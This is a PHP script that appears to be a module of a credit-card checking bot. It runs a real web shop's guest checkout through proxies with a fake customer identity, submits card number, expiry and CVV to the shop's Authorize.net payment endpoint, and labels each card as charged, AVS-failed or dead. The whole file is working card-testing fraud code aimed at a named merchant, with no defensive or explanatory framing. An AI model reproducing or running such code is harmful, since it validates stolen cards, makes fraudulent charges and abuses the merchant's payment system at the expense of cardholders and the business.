<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'quantity=1&product_id=674';

$r1 = $this->curlx->Post('https://entryandexit.com/index.php?route=checkout/cart/add', $data, null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$r2 = $this->curlx->Get('https://entryandexit.com/index.php?route=checkout/checkout', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$data = 'customer_group_id=1&firstname='.$fake->first.'&lastname='.$fake->last.'&email='.urlencode($fake->email).'&telephone=2564566543&fax=&company=&address_1=12+main+street&address_2=&city=Brewster&postcode=10509&country_id=223&zone_id=3655&shipping_address=1';

$r3 = $this->curlx->Post('https://entryandexit.com/index.php?route=checkout/guest/save', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$r4 = $this->curlx->Get('https://entryandexit.com/index.php?route=checkout/shipping_method', null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$data = 'shipping_method=weight.weight_7&comment=';

$r5 = $this->curlx->Post('https://entryandexit.com/index.php?route=checkout/shipping_method/save', $data, null, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$r6 = $this->curlx->Get('https://entryandexit.com/index.php?route=checkout/payment_method', null, $cookie, $server['proxy']);

if (!$r6->success) goto start;

$data = 'payment_method=authorizenet_aim&comment=&agree=1';

$r7 = $this->curlx->Post('https://entryandexit.com/index.php?route=checkout/payment_method/save', $data, null, $cookie, $server['proxy']);

if (!$r7->success) goto start;

$r8 = $this->curlx->Get('https://entryandexit.com/index.php?route=checkout/confirm', null, $cookie, $server['proxy']);

if (!$r8->success) goto start;

$data = 'cc_owner='.$fake->first.'+'.$fake->last.'&cc_number='.$cc.'&cc_expire_date_month='.$mm.'&cc_expire_date_year='.$yyyy.'&cc_cvv2='.$cvv;

$r9 = $this->curlx->Post('https://entryandexit.com/index.php?route=payment/authorizenet_aim/send', $data, null, $cookie, $server['proxy']);

if (!$r9->success) goto start;

$this->curlx->DeleteCookie();

$json_r9 = json_decode($r9->body);

if (isset($json_r9->success) || isset($json_r9->redirect)) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CHARGED - Payment was Successful'];

	goto end;
}

$err = $json_r9->error ?? 'Unknown Error!';

if (strpos($r9->body, 'This transaction has been approved') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CHARGED - This transaction has been approved.'];
} elseif (strpos($r9->body, 'AVS') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "AVS FAILED - $err"];
} else {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => "DEAD - $err"];
}

end: